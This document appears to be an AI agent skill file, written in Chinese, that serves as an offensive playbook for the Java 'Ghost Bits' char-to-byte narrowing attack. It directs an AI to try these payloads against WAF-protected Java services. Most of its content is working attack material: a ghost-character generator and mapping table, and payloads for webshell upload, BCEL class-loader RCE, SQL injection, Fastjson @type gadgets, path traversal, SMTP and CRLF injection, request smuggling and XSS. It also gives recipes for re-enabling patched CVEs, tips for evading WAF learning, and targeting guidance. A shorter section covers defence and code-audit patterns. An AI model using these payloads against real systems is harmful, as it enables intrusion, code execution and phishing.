---
name: ghost-bits-cast-attack
description: Java "幽灵位" / 投射攻击剧本（黑帽亚洲 2026）。在攻击 Java 服务时使用，此时 16 位字符会被静默地窄化为 8 位字节，以绕过 WAF/IDS 进行 SQL 注入、反序列化 RCE、文件上传（Webshell）、路径遍历、CRLF 注入、请求走私和 SMTP 注入。影响 Tomcat、Spring、Jetty、Undertow、Vert.x、Jackson、Fastjson、Apache Commons BCEL、Apache HttpClient、Angus Mail、JDK HttpServer、Lettuce、Jodd、XMLWriter，并通过 WAF 绕过重新启用许多“已修复”的 CVE。
---

# 技能：幽灵字节 / 投掷攻击 — Java char 到 byte 窄化操作手册

> **AI 加载指令**：这是一个仅适用于 Java 的注入启用原语，而非独立的漏洞类别。每当您看到 (1) Java 后端、(2) 前置 WAF/IDS，以及 (3) 菜单中的任何 {SQL 注入、反序列化 RCE、文件上传、路径遍历、CRLF、请求走私、SMTP 注入} 时，在宣告其“被阻断”之前，务必尝试幽灵字节变种的载荷。根本原因是 Java 代码在将 16 位 `char` 窄化为 8 位 `byte` 时，会静默丢失高位 8 位 — WAF 看到的是无害的 Unicode 字符，而后端则重建了原始的 ASCII 攻击字节。基础模型几乎不会采用这种原语。

> 来源：Black Hat Asia 2026 演讲 *Cast Attack: Java 中幽灵字节带来的新威胁*，由 白新宇 (@b1u3r)、陈志辉 (@1ue) 演讲，贡献者 郑宗正 (@chun_springX)。

## 0. 相关路由

幽灵字节是一种 *绕过* 原语，可重新启用许多其他操作手册的载荷。根据适用的攻击家族进行搭配：

- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — 当怀疑 Java 后端且 WAF 规则阻断字面量载荷时，这是在经典编码之外要尝试的首选技术。
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — 用于 Apache Commons BCEL ClassLoader 和 Fastjson `\u`/`\x` 转义变体。
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — Spring、Jetty、Undertow、Vert.x URL 解码和 `%2>` 十六进制折叠。
- [upload-insecure-files](../upload-insecure-files/SKILL.md) — Tomcat `RFC2231Utility` `filename*` Webshell 上传。
- [request-smuggling](../request-smuggling/SKILL.md) — Apache HttpClient `<= 4.5.9` (HTTPCLIENT-1974/1978) 头部 CRLF。
- [crlf-injection](../crlf-injection/SKILL.md) — Angus Mail / Jakarta Mail SMTP 注入和 JDK HttpServer 响应拆分。
- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) — Jackson `charToHex` 表查找截断隐藏 SQL 关键字在 Unicode 转义符内。

### 高级参考

当您需要时加载 [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md)：

- 完整的字节到幽灵字符查找表，涵盖所有可打印 ASCII 字节 0x20–0x7E 和最常用的控制字节 (0x00, 0x09, 0x0A, 0x0D)。
- 每个组件受影响版本矩阵和补丁标识符。
- Yaklang 和 Python 单行载荷生成器（用于 `poc.HTTP`、`codec.Encode`、原始套接字）。
- 蓝队 WAF 检测的“多视图归一化引擎”伪代码。

---

## 1. 一分钟心智模型

Java 的 `char` 是一个 **16 位** 无符号整数 (UTF-16 代码单元)。几乎每个网络协议 — HTTP/1.1、SMTP、Redis RESP、文件路径、原始字节流 — 都是 **8 位** 字节导向的。正确桥接它们的方式是显式字符集编码：

```
// 正确：显式 UTF-8，多字节字符变为多字节序列
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
out.write(bytes);
```

大量遗留代码、框架内部和“快速路径”优化会跳过这一步并静默窄化：

```
// 危险：高位 8 位被静默丢弃
byte b = (byte) ch;          // 0x966A -> 0x6A
out.write(ch);               // ByteArrayOutputStream.write(int) 保留低 8 位
dos.writeBytes(str);         // DataOutputStream 循环 char->byte 转换
int v = ch & 0xFF;           // 显式低字节掩码
```

丢失的高位 8 位就是 **幽灵字节**。它们将多字节 Unicode 字符在协议层转换为攻击者选择的单个 ASCII 字节。

```
视图 A（字符串层：WAF / 业务验证 / 日志）
  看到：陪 阮 严 灵 瘍 瘊 ...   "无害的 Unicode 垃圾，允许"
                  |
                  v       调用栈中某处静默窄化
视图 B（字节层：协议 / 文件系统 / 解析器 / 类加载器）
  看到：j  .  %  u  \r \n ...  "执行危险语义"

边界是在“视图 A”和“视图 B”不一致的精确时刻被突破的。
```

数学公式：要使视图 B 看到字节 `T`，选择任何 `k in 0x01..0xFF` 并使用：

```
c = chr((k << 8) | T)
```

这为您提供了 **每危险字节 255 个候选 Unicode 字符** — 足够的空间躲避任何基于签名的黑名单。

---

## 2. 三个根本原因家族

幽灵字节伞盖涵盖了三个不同的底层漏洞。区分它们告诉您 *要发送哪种载荷形状* 以及 *在源代码中要搜索什么*。

### 家族 A — 真正的高位截断（经典幽灵字节）

窄化是字面且无条件的。

```java
// 模式 A1：显式转换
byte b = (byte) ch;

// 模式 A2：按位掩码
int v = ch & 0xFF;
int v = ch & 255;

// 模式 A3：OutputStream.write(int) 仅保留低 8 位
out.write(ch);
baos.write(ch);

// 模式 A4：DataOutputStream.writeBytes(String) 迭代字符，
//            写入每个字符的低字节
dos.writeBytes(str);

// 模式 A5：遗留 API 但在旧代码中仍然存在
String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin);
new StringBufferInputStream(str);
raf.writeBytes(str);
```

典型影响：Tomcat `filename*`、Apache BCEL ClassLoader、Lettuce Redis 写入器、Angus Mail SMTP CRLF、HTTPCLIENT-1974 头部注入。

### 家族 B — 按位运算折叠（非法字符变为合法）

一个“快速”的十六进制 / Base64 / 字符集解码器使用按位技巧代替严格的范围检查，因此一个非法字符会折叠到合法字符上。

```java
// Jetty TypeUtil.fromHexDigit（简化）
private static int fromHexDigit(char c) {
    int x = c & 0x1F;          // 保留低 5 位
    x += (c >> 6) * 25;
    x -= 16;
    return x;                  // 预期 0..15，但没有范围检查
}
```

示例：输入 `>` (0x3E)：

```
0x3E & 0x1F = 0x1E = 30
(0x3E >> 6) * 25 = 0
30 + 0 - 16 = 14 = 0xE
```

所以 `%2>` 被静默解析为 `%2E` = `.`。相同的代数使 `%2^`、`%2~` 等等效于其他十六进制数字。

典型影响：Openfire CVE-2023-32315、GeoServer CVE-2024-36401、通用 URL 解码 WAF 绕过。

### 家族 C — 宽松的 Unicode 规范化

解码器接受那些碰巧被分类为“数字”或通过 `& 0xFF` 查找映射到十六进制值的 Unicode 字符 — 即使它们从未打算参与协议解析。

```java
// Fastjson：过于宽松
Character.digit(c, 16);   // 接受泰语、旁遮普语、全角数字

// Jackson：通过低 8 位索引到 ASCII 仅表
return sHexValues[ch & 0xff];

// 通用：全角规范化
// '2' (U+FF12) -> '2', 'e' (U+FF45) -> 'e'
```

典型影响：Fastjson `\u` 和 `\x` 转义绕过、全角 URL 编码路径遍历、Jackson `charToHex` SQLi 裹送。

---

## 3. 字符生成器

随时构建任何幽灵字节字符。这是每个代理应始终记住的函数：

```python
# Python
def ghost(target_byte: int, k: int = 1) -> str:
    """返回一个低 8 位等于 target_byte 的 Unicode 字符."""
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))

# 每个字节 255 个候选，例如对于 '.' (0x2E)：
candidates = [ghost(0x2E, k) for k in range(1, 256)]
# 阮(U+962E), Ⱦ?-前缀的...等。
```

```yak
// Yaklang（用于 poc.HTTP / 混淆）
func ghost(targetByte, k) {
    return string(rune(((k & 0xFF) << 8) | (targetByte & 0xFF)))
}
ghostJ = ghost(0x6A, 0x96)   // 返回 "陪"
```

选择指导：

- 避免代理范围 `0xD800..0xDFFF`（高位字节 0xD8..0xDF）— 这些不是有效的标量值，并且会在到达窄化位置之前被 JVM 字符串解码器替换，从而击败绕过。
- 优先选择在应用程序自己的字符集往返中幸存的字符（拉丁扩展、CJK 统一表意文字、CJK 包围字母和月份、韩文）。如果请求体使用 UTF-8，这些都会干净地编码成多字节序列，WAF 规则不会识别为 `.`, `/`, `j` 等。
- 在请求之间旋转 `k`，以防止基于签名的学习将单个字符与单个攻击关联起来。

---

## 4. 危险字节到幽灵字符映射

紧凑的红队武器化表格。对于攻击者实际需要的每个字节，都会给出一个经过验证的 Unicode 字符；如果 WAF 后来学习到示例，则可以替换另一个 `k`。

| 目标字节 | 十六进制 | 用于                          | 幽灵字符 | 代码点 |
|----------|----------|------------------------------|----------|--------|
| `\t`     | 0x09     | 头部折叠、解析器混淆          | `ĉ`      | U+0109 |
| `\n`     | 0x0A     | CRLF 注入、日志注入          | `瘊`      | U+760A |
| `\r`     | 0x0D     | CRLF 注入、请求走私          | `瘍`      | U+760D |
| ` `      | 0x20     | 头部中断、命令分隔符          | `Ġ`      | U+0120 |
| `"`      | 0x22     | JSON / quoted-printable 中的字符串中断 | `Ģ`     | U+0122 |
| `%`      | 0x25     | URL 编码前缀、二次解码      | `严`      | U+4E25 |
| `&`      | 0x26     | 参数分隔符                  | `Ȧ`      | U+0226 |
| `'`      | 0x27     | SQL 字符串中断              | `ȧ`      | U+0227 |
| `(`      | 0x28     | EL/SpEL/OGNL 语法          | `Ȩ`      | U+0228 |
| `)`      | 0x29     | EL/SpEL/OGNL 语法          | `ȩ`      | U+0229 |
| `.`      | 0x2E     | 路径遍历、扩展              | `阮`      | U+962E |
| `/`      | 0x2F     | 路径分隔符                  | `丯`      | U+4E2F |
| `0`      | 0x30     | 十六进制数字构建            | `丰`      | U+4E30 |
| `1`      | 0x31     | 十六进制数字构建            | `失`      | U+5931 |
| `2`      | 0x32     | 十六进制数字构建            | `甲`      | U+7532 |
| `3`      | 0x33     | 十六进制数字构建            | `耳`      | U+8033 |
| `;`      | 0x3B     | 命令分隔符、头部延续        | `Ȼ`      | U+023B |
| `<`      | 0x3C     | XSS / XML 标签开始          | `ȼ`      | U+023C |
| `=`      | 0x3D     | 参数 / 头部值              | `Ƚ`      | U+023D |
| `>`      | 0x3E     | XSS / XML 标签结束          | `Ⱦ`      | U+023E |
| `@`      | 0x40     | Fastjson `@type`、邮件地址  | `ŀ`      | U+0140 |
| `a`      | 0x61     | 关键字 `class`、字母        | `ᙡ`      | U+1661 |
| `c`      | 0x63     | 关键字 `class`、`cmd`        | `㹣`      | U+3E63 |
| `e`      | 0x65     | 十六进制数字                | `来`      | U+6765 |
| `j`      | 0x6A     | 扩展 `.jsp`                  | `陪`      | U+966A |
| `l`      | 0x6C     | 关键字 `class`、`闭包`      | `౬`      | U+0C6C |
| `n`      | 0x6E     | 关键字 `Runtime`、`联合`    | `陮`      | U+966E |
| `s`      | 0x73     | 关键字 `class`、`select`    | `⑳`      | U+2473 |
| `t`      | 0x74     | 关键字 `Runtime`、`类型`    | `Ŵ`      | U+0174 |
| `u`      | 0x75     | `\u` 转义引入符            | `灵`      | U+7075 |

工作流提示：保留 ASCII `Ŀ`、`ȧ`、`ȼ` 等变体用于紧密的 HTTP 头部上下文（一个字节 UTF-8 扩展保持更小）；使用 CJK 如 `阮`、`陪`、`严`，当您想使 WAF “这只是文本” 分类器产生偏差时。

---

## 5. 每个组件的载荷配方

每个配方都显示双重视图：WAF 检查的内容与后端实际执行的内容。这是解释 *为什么* 载荷能够通过的唯一可靠方法。

### 5.1 Tomcat `RFC2231Utility` — 文件上传 Webshell（家族 A）

触发：任何接受 multipart 上传且 Tomcat 解析 `Content-Disposition: ... filename*=UTF-8''...` 的端点。Tomcat 的 RFC2231 解码器将每个非百分号字符直接转换为字节，静默丢弃高位 8 位。

载荷：

```
Content-Disposition: attachment; filename*=UTF-8''1.陪sp
```

| 阶段                  | 它看到的名字         |
|------------------------|----------------------|
| WAF / 扩展过滤器      | `1.陪sp`（不是 `.jsp`，允许） |
| Tomcat RFC2231 解码器 | `陪` -> 低字节 0x6A -> `j` |
| 文件系统            | `1.jsp`              |

当上传目标目录固定但应用程序接受 `filename*` 时，结合第 4 节中的遍历字符（`阮`、`丯`）。

### 5.2 Apache Commons BCEL — ClassLoader RCE（家族 A）

触发：任何通过 `BCEL` 解析类名的汇点（`$$BCEL$$...`）或任何解码 BCEL 通过 `JavaReader` -> `ByteArrayOutputStream` 循环的代码。

易受攻击形状：

```java
ByteArrayOutputStream bos = new ByteArrayOutputStream();
JavaReader jr = new JavaReader(new CharArrayReader(userChars));
while ((ch = jr.read()) >= 0) {
    bos.write(ch);     // 仅保留低 8 位
}
```

攻击：将恶意 BCEL 字节码的每个字节包装在低 8 位等于该字节的 Unicode 字符中。解码的字节流是有效的 BCEL 类；WAF 看到的是大量看似随机的 CJK 文本，没有 `$$BCEL$$` 关键字或类签名。

| 视图 | 内容 |
|------|------|
| WAF  | `$$BCEL$$` 后跟随机看起来的 CJK |
| BCEL | 标准 BCEL 类文件字节 → JVM defineClass → RCE |

蓝队防御：检查 BCEL 的 WAF 必须在模式匹配之前在每个字符上复制 `bos.write(ch)` 语义。

### 5.3 Jackson `charToHex` — SQLi 裹送（家族 C）

触发：任何 Jackson 解析的 JSON 字段，其值稍后嵌入到 SQL 或另一个解析器中。Jackson 通过以下方式解析 `\uXXXX` 数字：

```java
private static final int[] sHexValues = new int[128];
public static int charToHex(int ch) {
    return sHexValues[ch & 0xFF];   // 掩码首先，查找其次
}
```

任何非 ASCII 字符，其低 8 位落在已填充索引上，都会返回该十六进制数字。WAF 看到的是乱码；Jackson 重建了 ASCII 载荷。

载荷（裹送数字 `1` 用于 UNION 列计数）：

```json
{"q": "\u丰丰耳失 union select 1,2,3 -- "}
```

| 视图    | 内容                                             |
|---------|-----------------------------------------------------|
| WAF     | `\u丰丰耳失 union select ...`（没有前导数字）    |
| Jackson | `\u0031 union select 1,2,3-- ` -> `1 union select…` |

与 [sqli-sql-injection](../sqli-sql-injection/SKILL.md) 配合使用，用于下游 UNION / 布尔 / 时间触发载荷模板。

### 5.4 Fastjson — `\u` 和 `\x` 转义绕过（家族 B + C）

两个独立表面：

(a) `\u` 转义 — `Character.digit(c, 16)` 接受 ASCII 范围之外的 Unicode 数字类别（泰语 `๐-๙` U+0E50..U+0E59、旁遮普语 `੦-੯` U+0A66..U+0A6F、全角 `０-９` U+FF10..U+FF19）。

```json
{"\u４_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

WAF 视图: `\u４_type`（没有 `@type` 字面量）。Fastjson 将全角 `４` 规范化到 `4`，然后处理下面的 `\x` 快捷方式，生成 `@type`。

(b) `\x` 转义 — Fastjson 计算 `digits[x1] * 16 + digits[x2]`。一个非法十六进制字符返回默认值 0。

```
\x4_   ->   '4'(=4) * 16 + '_'(=0) = 0x40 = '@'
```

```json
{"\x4_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

| 视图     | 字段名 |
|----------|--------|
| WAF      | `\x4_type`（不是 `@type`） |
| Fastjson | `@type` -> JdbcRowSetImpl 自动类型小工具触发 |

### 5.5 Spring / Jetty / Undertow / Vert.x — URL 解码（家族 A + B）

两个可组合技巧：

技巧 1 — 家族 A 字符在路径或查询中的替换：

```
/api/v1/data?file=阮丯阮丯etc丯passwd
                = 字节层上的 ../../etc/passwd
```

技巧 2 — 当 Jetty 的 `TypeUtil.fromHexDigit` 在链中时 `%2>` 折叠：

```
/setup/setup-s/%2>%2>/log.jsp
                = 解码后的 /setup/setup-s/../log.jsp
```

单独使用可以绕过大多数基于签名的 WAF；组合它们甚至可以存活“规范化然后匹配”规则，这些规则只看到 ASCII 百分号三重字母。

Spring CVE-2025-41242 链（`StringUtils.uriDecode` 在 PR #34673 中修补）：

```
输入 :  阮严灵丰丰甲来
       (.)(%)(u)(0)(0)(2)(e)
窄化:  .%u002e
解码:  ..
结果:  通过路径遍历进行任意文件读取
```

| 阶段           | 路径           |
|-----------------|----------------|
| Spring `isInvalidPath()` | `.%u002e` — no literal `..`, allow |
| 后端文件解析  | `..` after `%u002e` decode → traversal |

### 5.6 Angus Mail / Jakarta Mail — SMTP 注入 (家族 A)

触发：任何从用户控制字符串构建 SMTP 信封或标题的应用程序。内部 `ASCIIUtility` 执行：

```java
byte b = (byte) ch;           // 16-bit char silently narrowed
```

将 CRLF 作为 `瘍瘊` 滥用：

```
hacker@evil.com瘍瘊Subject: Password reset code瘍瘊To: target@victim.com瘍瘊瘍瘊Your code is 1234
```

| 查看 | 它解析的内容 |
|------|----------------|
| 应用程序验证 | 包含奇数 CJK 的单个 `From` 值 |
| SMTP 服务器            | 五个单独的标题行 + 正文，完全伪造 |

真实影响模式：Jira 风格 (CVE-2025-57733) 密码重置劫持，Confluence 域允许列表绕过 — 与 [crlf-injection](../crlf-injection/SKILL.md) 配合使用以重用非邮件 CRLF。

### 5.7 Apache HttpClient `<= 4.5.9` — 请求走私 (家族 A)

HTTPCLIENT-1974 / HTTPCLIENT-1978: 标题值通过 `OutputStreamWriter` 传递，加上一个窄化写操作，它为 `\u760D\u760A` 发射原始 `\r\n`。

```
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1
```

| 跳转 | 看到 |
|-----|------|
| 前端代理 / WAF | 一个具有长 `X-Auth-Token` 的请求 |
| 源            | 两个请求；第二个是一个管理员 POST |

在确认不同步后，参考 [request-smuggling](../request-smuggling/SKILL.md) 进行选择前缀攻击。

### 5.8 JDK HttpServer — 响应拆分 (CVE-2026-21933, 家族 A)

用户输入的反射到响应标题中通过 `com.sun.net.httpserver` 写入器传递，这些写入器对每个字符进行低字节窄化。

负载（URL 参数或上游标题）：

```
Custom: Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
```

服务器发出两个逻辑响应；第二个携带攻击者选择的正文。升级为存储型 XSS、缓存中毒和 SSO 重定向链。

### 5.9 其他受影响的组件

相同的家族 A 原语，不同的接收器：

- **Lettuce (Redis 客户端)** — 通过将 `\r\n` 溜入 RESP 帧中进行命令注入；链接到任意 `CONFIG SET dir` + `SAVE` 以实现 SSRF-to-RCE。
- **Jodd `FileNameUtil`** — 由于其内部写循环窄化，通过 `阮` 和 `丯` 进行路径遍历。
- **XMLWriter** — 当属性或文本节点值通过低字节写入器推送时，发生标签名注入；XXE / XSS 转换。
- **ActiveJ HTTP** — 与 5.7 / 5.8 相同形状的 CRLF 注入。
- **Vert.x HTTP 正文解析器** — 家族 A 在 `MultipartParser` 中。

参见 [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md) 获取受影响版本矩阵和每个组件的完整负载骨架。

---

## 6. 已知 CVE 绕过配方

在相应 CVE 已修补但 WAF 仍然面向服务时使用。以下每个负载将原始 ASCII 攻击转换为一种形式，该形式可以绕过基于字符串的 WAF 规则。

### Openfire CVE-2023-32315 — 认证绕过 (家族 B)

原始公共绕过：

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

Ghost Bits / `%2>` 折叠绕过（更难生成签名）：

```
GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp
```

每个 `%2>` 通过 Jetty 的宽松十六进制折叠为 `%2E` = `.`，从而产生相同的 `../../` 遍历，而永远不会向 WAF 发射 `..` 或 `%2e`。

### GeoServer CVE-2024-36401 — 通过 `Runtime` 关键字实现 RCE (家族 B)

公共 WAF 规则通常阻止 `Runtime`。注入一个折叠字符：

```
Ru%6>time
```

解码数学：`%6>` -> `%6E` -> `n`。表达式评估器现在看到 `Runtime`，WAF 从未看到。

### Spring4Shell CVE-2022-22965 — 类加载器链 (家族 A)

必需参数前缀 `class.module.classLoader...`。WAFs 阻止字面量 `class`。通过低字节字符替换：

```
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader.resources..."
```

| 组件 | 字符  | 代码点 | 低字节 |
|-----------|-------|------------|----------|
| `c`       | `㹣`  | U+3E63     | 0x63     |
| `l`       | `౬`  | U+0C6C     | 0x6C     |
| `a`       | `ᙡ`  | U+1661     | 0x61     |
| `s`       | `⑳`  | U+2473     | 0x73     |
| `s`       | `⑳`  | U+2473     | 0x73     |

Spring 的参数名解析器窄化回 `class`。

### Spring CVE-2025-41242 — 任意文件读取 (家族 A + 家族 B 混合)

已在上述 5.5 中演示。负载 `阮严灵丰丰甲来` -> `.%u002e` -> 解码后验证的 `..`。

### Jakarta Mail CVE-2025-57733 — Jira 风格邮件劫持 (家族 A)

```
to=victim@org.com瘍瘊Subject: Reset code瘍瘊To: attacker@evil.com瘍瘊瘍瘊Your code is 1234
```

邮件离开公司 SMTP 服务器时具有有效的 SPF / DKIM / DMARC，但其 `To:` 和 `Subject:` 是攻击者选择的 — 高保真度网络钓鱼。

---

## 7. 检测决策树

在排定目标时使用。目的是在 Ghost Bits 无法帮助时避免它，并且在满足先决条件时始终尝试它。

```
后端是 Java 吗？ (服务器标题、错误页面、JSESSIONID、.do/.action、
                      WebGoat 风格的堆栈跟踪、X-Powered-By、X-Frame-Options
                      使用 Tomcat 默认值)
├── 否  -> 停止，Ghost Bits 不适用
└── 是
    │
    ├── 是否有 WAF / IDS 或输入过滤器阻止您的字面量负载？
    │   ├── 否  -> 使用字面量负载；Ghost Bits 过度
    │   └── 是 -> 继续
    │
    ├── 您正在针对哪个接收器？
    │   ├── 文件上传通过 multipart  -> 配方 5.1 (Tomcat filename*)
    │   ├── JSON 反序列化       -> 配方 5.3 (Jackson) / 5.4 (Fastjson)
    │   ├── 类加载器 / BCEL 引用    -> 配方 5.2
    │   ├── URL 路径 / 参数       -> 配方 5.5 + 家族 B `%2>`
    │   ├── 标题反射          -> 配方 5.7 / 5.8
    │   ├── 邮件发送                  -> 配方 5.6
    │   └── Redis / RESP / XML / RPC   -> 配方 5.9
    │
    ├── 首先使用单个非破坏性替换进行探测
    │   (用 Ghost 变体替换一个字符；观察响应差异：
    │    状态代码、长度、标题回显、错误消息、时间)
    │
    └── 如果出现可观察的差异 -> 通过替换所有阻止的字符并链接
                                            通过相关的剧本进行升级。
```

---

## 8. SAST / 代码审计签名

在审查 Java 源代码时，三个优先级级别。跨所有您的项目存储库、所有可以阴影的依赖项以及任何已部署设备的 `lib/` 进行搜索。

### 级别 1 — 直接窄化 (家族 A)

```
\(byte\)\s*\w+
&\s*0[xX][fF][fF]
&\s*255
\.write\(\s*[a-zA-Z_]\w*\s*\)         # OutputStream.write(int)
writeBytes\s*\(
StringBufferInputStream
String\.getBytes\s*\(\s*int
RandomAccessFile.*writeBytes
```

### 级别 2 — 宽松十六进制 / 数字解码 (家族 B + C)

```
Character\.digit\s*\(
fromHexDigit
convertHexDigit
fromHex\s*\(
uriDecode
URLDecoder\.decode
sHexValues\[
& 0x1F\)\s*\+\s*\(.*>>.*\) \* 25
```

### 级别 3 — 高风险包装器和可访问性

```
RFC2231                # Tomcat / mail filename* 解析
JavaReader             # BCEL ClassLoader 可访问
ASCIIUtility           # Jakarta Mail / Angus Mail
LineParser             # HttpClient 标题解析器
ChunkedDecoder         # 请求走私相邻
charToHex              # Jackson
encodeUTF8             # 候选用于 char->byte 写入器
```

每个查找的排定适用 **五维风险模型**：

| 维度     | 如果更高风险则                     |
|---------------|--------------------------------------------------------------------|
| 输入控制 | HTTP 参数、标题、文件名、JSON 键、邮件地址               |
| 验证    | 拒绝/允许列表在窄化站点之前运行                 |
| 窄化时间 | 转换发生在安全检查之后                           |
| 语法目标 | 结果进入 URL / SMTP / HTTP / Redis / 文件系统 / SQL 语法 |
| 重新解码   | Base64、URL-decode、JSON 解码、`%u` 等稍后发生         |

风险公式：

```
attacker-controlled  +  check-before-narrow  +  result-in-protocol-syntax
                                              +  later-redecoding
                              = HIGH SEVERITY
```

---

## 9. 差异测试工作流程

一个可重复的、黑盒程序，用于找到新的 Ghost Bits 接收器（红队）或验证修复（蓝队）。

```
1. 一次选择一个危险字节 T (例如 0x2E 为 '.')。

2. 生成候选集：
       C = { chr((k << 8) | T) for k in 1..255 }
   丢弃代理 0xD8XX..0xDFXX。

3. 对于 C 中的每个候选 c：
       a. 发送一个在选定位置具有 c 的良性请求。
       b. 发送相同的请求，在相同位置具有字面量 T。
       c. 比较四个可观察项：
            - 状态代码
            - 响应正文长度
            - 响应正文内容哈希（或差异）
            - 服务器端日志行（如果可用）

4. 如果任何候选产生与 T 相同的响应，但与“中性”字符（例如 'X’）不同，则您已找到窄化接收器。

5. 对下一个 T 在您的优先级列表中重复：
       0x2E ('.'), 0x2F ('/'), 0x25 ('%'), 0x40 ('@'),
       0x0D ('\r'), 0x0A ('\n'), 0x6A ('j'), 0x73 ('s'),
       0x6C ('l'), 0x61 ('a'), 0x63 ('c'), 0x22 ('"'), 0x27 (''')

6. 按组件聚类接收器（响应服务器标题、错误堆栈） — 一个接收器通常意味着整个框架版本都易受攻击。
```

此工作流程有意协议无关；相同的循环适用于文件上传器、搜索端点、邮件作曲家或 Redis 支持的缓存。

---

## 10. 防御意识

五个层次，全部都需要；任何单一层次都可以单独绕过。

| 层次            | 行动                                                               |
|------------------|----------------------------------------------------------------------|
| 源代码      | 禁止手写的 `(byte) ch`，`& 0xFF`，`out.write(ch)`，`writeBytes`。使用 `getBytes(StandardCharsets.UTF_8)` 或严格 ASCII 允许列表用于协议字段。 |
| 解码器          | 拒绝非法输入。永远不会默认折叠未知十六进制 / Unicode 数字 / Base64 字符为 0 或其低 8 位。 |
| 验证顺序 | 始终首先规范化，然后验证。具体来说：严格解码 → Unicode NFC/NFKC → 协议规范化 (URL `..` 解析，`File.getCanonicalPath`) → 安全检查 → 执行。 |
| 协议字段   | 按字段使用严格允许列表（HTTP 标题值、SMTP 信封、URL 路径、文件名、JSON 键、XML 标签）。拒绝任何标题或地址中的 CR/LF。 |
| WAF / IDS        | 运行一个 *多视图* 规范化器。始终检查原始字符串 AND `(char) & 0xFF` 视图 AND URL 解码视图 AND Unicode-NFKC 视图。当任何视图包含原始字符串所缺乏的危险语义时发出警报。 |

蓝队气味测试：

- 日志在协议语法期望 ASCII 的位置包含 CJK / Latin-Extended 字符（文件名、标题值、邮件地址）。
- 请求的十六进制转储包含协议分隔符相邻的字节以外的字节。
- 一个渗透测试或扫描器报告了一个“奇怪的 200”，安全监控没有标记 — Ghost Bits 是 2025-2026 年 Java 堆栈中最常见的这种模式的原因。

---

## 11. 快速参考 — 关键负载

```text
# Ghost 字符生成器
ghost(T, k) = chr(((k & 0xFF) << 8) | (T & 0xFF))     # 避免 k 在 0xD8..0xDF

# Tomcat 文件名* Webshell 上传
Content-Disposition: attachment; filename*="UTF-8''shell.陪sp"     # → shell.jsp

# BCEL ClassLoader 绕过 (概念)
$$BCEL$$<每个类文件字节都用一个 Unicode 字符包装>

# Jackson SQLi 溜雪
{"q":"\u丰丰耳失 union select 1,2,3-- "}                          # → "1 union select…"

# Fastjson @type 溜雪
{"\x4_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}

# Spring URL 解码 + Jetty %2> 折叠
GET /api/data?file=阮丯阮丯etc丯passwd
GET /setup/setup-s/%2>%2>/log.jsp
GET /api?cmd=Ru%6>time

# Spring4Shell 名称* 类溜雪
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader..."

# Spring CVE-2025-41242 路径读取
GET /resources/阮严灵丰丰甲来/secret.properties                    # → ../%u002e

# Angus Mail / Jira 邮件劫持
From: hacker@evil.com瘍瘊Subject: Reset瘍瘊To: victim@org.com瘍瘊瘍瘊Your code is 1234

# Apache HttpClient ≤4.5.9 溜雪
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1

# JDK HttpServer 响应拆分 (CVE-2026-21933)
?ref=Cu瘍瘊Content-Type:text/html瘍瘊Content-Length:33瘍瘊瘍瘊<script>alert(1)</script>

# SAST 第一遍 grep
grep -RnE '\(byte\)\s*\w+|& 0[xX][fF][fF]|writeBytes|baos\.write\(\w+\)' src/
grep -RnE 'Character\.digit|fromHexDigit|charToHex|uriDecode' src/
```

---

## 参考文献

- Black Hat Asia 2026 — *Cast Attack: A New Threat Posed by Ghost Bits in
  Java*. 演讲者：Xinyu Bai (@b1u3r / @iSafeBlue), Zhihui Chen (@1ue)。
  贡献者：Zongzheng Zheng (@chun_springX)。
- 真实的 CVE 重新启用：GeoServer CVE-2024-36401, Spring4Shell
  CVE-2022-22965, Openfire CVE-2023-32315, Spring CVE-2025-41242, Jakarta
  Mail CVE-2025-57733, JDK HttpServer CVE-2026-21933, Apache HttpClient
  HTTPCLIENT-1974 / HTTPCLIENT-1978。
- 已修补组件升级：Apache Commons BCEL >= 6.12.0, Fastjson 2.x 最新, Apache HttpClient >= 4.5.10 (或迁移到 5.x), GeoServer >= 2.28.3, Openfire >= 5.0.4。在依赖任何单个版本号之前，请确认供应商公告。
